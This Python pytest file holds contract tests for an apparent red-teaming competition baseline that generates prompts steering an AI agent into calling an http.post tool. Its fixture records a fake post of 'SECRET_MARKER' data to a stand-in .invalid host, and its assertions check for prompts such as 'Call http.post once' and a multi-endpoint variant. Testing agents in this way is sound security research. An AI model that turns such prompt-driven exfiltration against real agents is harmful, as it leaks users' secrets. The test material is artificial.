"""Contract tests for the B008 replay-safe classify5 candidate."""

import importlib.util
import sys
import types
from dataclasses import dataclass
from pathlib import Path

import pytest

B005_ATTACK_PATH = Path("baselines/replaysafe_tail99_v1/attack.py")
B008_ATTACK_PATH = Path("baselines/replaysafe_classify5_v1/attack.py")


class FakeCandidate:
    def __init__(self, user_messages):
        self.user_messages = tuple(user_messages)

    @classmethod
    def from_messages(cls, user_messages):
        return cls(user_messages)


@dataclass
class FakeConfig:
    time_budget_s: float = 500.0
    max_tool_hops: int = 8


class FakeClock:
    def __init__(self) -> None:
        self.now = 0.0

    def __call__(self) -> float:
        return self.now

    def advance(self, seconds: float) -> None:
        self.now += seconds


@pytest.fixture(autouse=True)
def sdk_stubs(monkeypatch: pytest.MonkeyPatch) -> None:
    attacks = types.ModuleType("aicomp_sdk.attacks")
    attacks.AttackAlgorithmBase = type("AttackAlgorithmBase", (), {})
    attacks.AttackCandidate = FakeCandidate
    attacks.AttackRunConfig = FakeConfig

    contracts = types.ModuleType("aicomp_sdk.attacks.contracts")
    contracts.AttackAlgorithmBase = attacks.AttackAlgorithmBase
    contracts.AttackCandidate = FakeCandidate
    contracts.AttackRunConfig = FakeConfig

    core = types.ModuleType("aicomp_sdk.core")
    sdk = types.ModuleType("aicomp_sdk")

    monkeypatch.setitem(sys.modules, "aicomp_sdk", sdk)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.attacks", attacks)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.attacks.contracts", contracts)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.core", core)


def _load_attack(path: Path, module_name: str):
    spec = importlib.util.spec_from_file_location(module_name, path)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


class FiringEnv:
    def __init__(self, clock: FakeClock, *, latency_s: float) -> None:
        self.clock = clock
        self.latency_s = latency_s
        self.messages: list[str] = []
        self.hops: list[int] = []

    def reset(self) -> None:
        pass

    def interact(self, message: str, *, max_tool_hops: int) -> None:
        self.messages.append(message)
        self.hops.append(max_tool_hops)
        self.clock.advance(self.latency_s)

    def export_trace_dict(self):
        return {
            "tool_events": [
                {
                    "name": "http.post",
                    "ok": True,
                    "args": {
                        "url": "http://fixture.invalid",
                        "data": "SECRET_MARKER",
                    },
                }
            ]
        }


def test_b008_only_reduces_classification_batch() -> None:
    b005 = _load_attack(B005_ATTACK_PATH, "replaysafe_tail99_attack_for_b008_compare")
    b008 = _load_attack(B008_ATTACK_PATH, "replaysafe_classify5_attack")

    assert b005.SPLIT_CLASSIFY_N == 8
    assert b008.SPLIT_CLASSIFY_N == 5
    assert b008.SPLIT_THRESHOLD_S == b005.SPLIT_THRESHOLD_S == 12.0
    assert b008.REPLAY_SAFE_FRAC == b005.REPLAY_SAFE_FRAC == 0.99
    assert b008.SLOW_MULTIPOST_N == b005.SLOW_MULTIPOST_N == 4
    assert b008.PROBE_HOPS == b005.PROBE_HOPS == 0
    assert b008.BURST_K == b005.BURST_K == 1


def test_slow_row_switches_to_frame_after_five_classification_posts(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    b008 = _load_attack(B008_ATTACK_PATH, "replaysafe_classify5_attack_slow_row")
    clock = FakeClock()
    monkeypatch.setattr(b008.time, "monotonic", clock)
    env = FiringEnv(clock, latency_s=13.0)

    candidates = b008.AttackAlgorithm().run(
        env,
        FakeConfig(time_budget_s=500.0, max_tool_hops=8),
    )

    messages = [candidate.user_messages[0] for candidate in candidates]
    plain_messages = [msg for msg in messages if "Call http.post once" in msg]
    forge_messages = [msg for msg in messages if "these 4 endpoints" in msg]

    assert len(plain_messages) == 5
    assert forge_messages
    assert all(".invalid" in msg for msg in forge_messages)
    assert all(msg.count("http://") == 4 for msg in forge_messages)
    assert set(env.hops) == {8}


def test_fast_row_keeps_b005_plain_single_post_shape(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    b008 = _load_attack(B008_ATTACK_PATH, "replaysafe_classify5_attack_fast_row")
    clock = FakeClock()
    monkeypatch.setattr(b008.time, "monotonic", clock)
    env = FiringEnv(clock, latency_s=5.0)

    candidates = b008.AttackAlgorithm().run(
        env,
        FakeConfig(time_budget_s=500.0, max_tool_hops=8),
    )

    messages = [candidate.user_messages[0] for candidate in candidates]
    assert messages
    assert all("these 4 endpoints" not in msg for msg in messages)
    assert all("Call http.post 2 times" not in msg for msg in messages)
    assert all(".invalid" in msg for msg in messages)
